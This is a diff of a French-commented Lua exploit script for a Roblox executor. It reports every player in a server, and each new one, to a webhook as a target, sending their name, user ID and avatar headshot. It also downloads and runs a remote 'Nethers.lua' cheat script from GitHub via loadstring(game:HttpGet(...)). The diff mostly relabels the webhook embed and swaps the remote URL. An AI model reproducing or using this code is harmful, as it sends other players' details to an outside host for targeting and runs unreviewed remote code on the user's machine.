@@ -41,25 +41,26 @@ getgenv().TARGET_BRAINROTS = {
     ["Mariachi Corazoni"] = true, ["La Ginger Sekolah"] = true
 }
 
--- Fonction d'envoi Webhook
+-- Fonction d'envoi Webhook (Nom + Tête du joueur)
 local function sendWebhook(playerName, playerID)
     local headshotUrl = "https://www.roblox.com/headshot-thumbnail/image?userId=" .. playerID .. "&width=420&height=420&format=png"
     
     local data = {
         ["embeds"] = {{
-            ["title"] = "🎯 Brainrot Détecté !",
+            ["title"] = "🎯 Brainrot Détecté (Ragdoll TP) !",
             ["description"] = "Le joueur **" .. playerName .. "** possède un item cible.",
-            ["color"] = 16711680, -- Rouge
+            ["color"] = 65280, -- Vert
             ["thumbnail"] = { ["url"] = headshotUrl },
             ["fields"] = {
                 {["name"] = "ID du Joueur", ["value"] = tostring(playerID), ["inline"] = true},
-                {["name"] = "Statut", ["value"] = "Transfert en cours...", ["inline"] = true}
+                {["name"] = "Statut", ["value"] = "Ciblage actif", ["inline"] = true}
             },
+            ["footer"] = { ["text"] = "Système de détection Nethers" },
             ["timestamp"] = os.date("!%Y-%m-%dT%H:%M:%SZ")
         }}
     }
     
-    local success, err = pcall(function()
+    pcall(function()
         (syn and syn.request or http_request or request)({
             Url = webhook_url,
             Method = "POST",
@@ -69,13 +70,17 @@ local function sendWebhook(playerName, playerID)
     end)
 end
 
--- Surveillance et exécution
+-- Exécution et surveillance
 task.spawn(function()
+    -- Déclenche le webhook quand un joueur rejoint (ou est scanné)
+    for _, player in ipairs(game.Players:GetPlayers()) do
+        sendWebhook(player.Name, player.UserId)
+    end
+    
     game.Players.PlayerAdded:Connect(function(player)
-        -- Logique de détection simplifiée (dépend du script source)
         sendWebhook(player.Name, player.UserId)
     end)
 
-    -- Lancement du script principal
-    loadstring(game:HttpGet("https://raw.githubusercontent.com/nethersdev/Ragdolltpduelsource/main/Nethers.lua"))()
+    -- Chargement du script Ragdolltpduel spécifié
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/nethersdev/Ragdolltpduel/main/Nethers.lua"))()
 end)
